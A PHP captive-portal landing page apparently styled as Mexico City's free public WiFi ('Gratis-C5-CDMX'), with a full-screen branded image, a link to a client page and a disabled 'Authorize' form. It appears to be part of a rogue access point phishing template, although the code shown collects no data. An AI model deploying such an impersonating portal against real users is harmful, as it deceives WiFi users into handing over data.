<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<HTML>
    <HEAD>
        <title>Gratis-C5-CDMX</title>
        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
        <meta http-equiv="Pragma" content="no-cache" />
        <meta http-equiv="Expires" content="0" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                overflow: hidden;
            }
            .background-image {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: url('cfe.png') no-repeat center center;
                background-size: cover;
            }
            .button-container {
                position: absolute;
                width: 100%;
                bottom: 10px;
                text-align: center;
            }
            button {
                padding: 10px 20px;
                font-size: 16px;
                color: white;
                background-color: #007BFF;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                disabled: disabled;
            }
        </style>
    </HEAD>

    <BODY>
        <a href="cliente.html" class="background-image"></a>
        <div class="button-container">
            <form method="POST" action="/captiveportal/index.php">
                <input type="hidden" name="target" value="<?=$destination?>">
                <button type="submit" disabled>Authorize</button>
            </form>
        </div>
    </BODY>
</HTML>
